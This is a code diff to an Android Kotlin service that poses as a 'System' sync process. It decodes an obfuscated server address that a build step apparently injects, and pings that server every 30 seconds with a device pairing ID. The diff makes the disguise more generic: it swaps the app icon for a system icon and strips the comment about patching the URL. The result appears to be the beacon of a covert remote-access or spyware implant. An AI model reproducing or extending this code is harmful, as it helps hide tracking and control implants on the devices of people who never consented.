@@ -10,17 +10,13 @@ import android.os.IBinder
 import android.util.Base64
 import androidx.core.app.NotificationCompat
 import org.json.JSONObject
-import java.io.BufferedReader
-import java.io.InputStreamReader
 import java.net.HttpURLConnection
 import java.net.URL
 import java.util.concurrent.Executors
-import kotlin.concurrent.thread
 
 class DeviceService : Service() {
 
     companion object {
-        // inject_config patches this base64
         val SERVER_URL: String
             get() = String(
                 Base64.decode(
@@ -37,31 +33,29 @@ class DeviceService : Service() {
     override fun onCreate() {
         super.onCreate()
         startFg()
-        exec.execute { heartbeatLoop() }
+        exec.execute { loop() }
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        return START_STICKY
-    }
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
 
     private fun startFg() {
-        val chId = "sync_ch"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+        val id = "sync_ch"
+        if (Build.VERSION.SDK_INT >= 26) {
             val nm = getSystemService(NotificationManager::class.java)
             nm?.createNotificationChannel(
-                NotificationChannel(chId, "Sync", NotificationManager.IMPORTANCE_MIN)
+                NotificationChannel(id, "Sync", NotificationManager.IMPORTANCE_MIN)
             )
         }
-        val n: Notification = NotificationCompat.Builder(this, chId)
+        val n: Notification = NotificationCompat.Builder(this, id)
             .setContentTitle("System")
             .setContentText("Running")
-            .setSmallIcon(R.mipmap.ic_launcher)
+            .setSmallIcon(android.R.drawable.ic_menu_info_details)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
         startForeground(1001, n)
     }
 
-    private fun readPair(): String {
+    private fun pair(): String {
         return try {
             val t = assets.open("uid.json").bufferedReader().readText()
             JSONObject(t).optString("pair", "NEONXJZET0000")
@@ -70,25 +64,21 @@ class DeviceService : Service() {
         }
     }
 
-    private fun heartbeatLoop() {
-        val pair = readPair()
+    private fun loop() {
+        val p = pair()
         while (true) {
             try {
-                val base = SERVER_URL.trimEnd('/')
-                val url = URL("$base/ping?pair=$pair")
-                val c = url.openConnection() as HttpURLConnection
+                val u = URL(SERVER_URL.trimEnd('/') + "/ping?pair=" + p)
+                val c = u.openConnection() as HttpURLConnection
                 c.connectTimeout = 8000
                 c.readTimeout = 8000
                 c.requestMethod = "GET"
                 c.connect()
-                c.inputStream.bufferedReader().readText()
+                try { c.inputStream.close() } catch (_: Exception) {}
                 c.disconnect()
             } catch (_: Exception) {
             }
-            try {
-                Thread.sleep(30_000)
-            } catch (_: Exception) {
-            }
+            try { Thread.sleep(30000) } catch (_: Exception) {}
         }
     }
 }
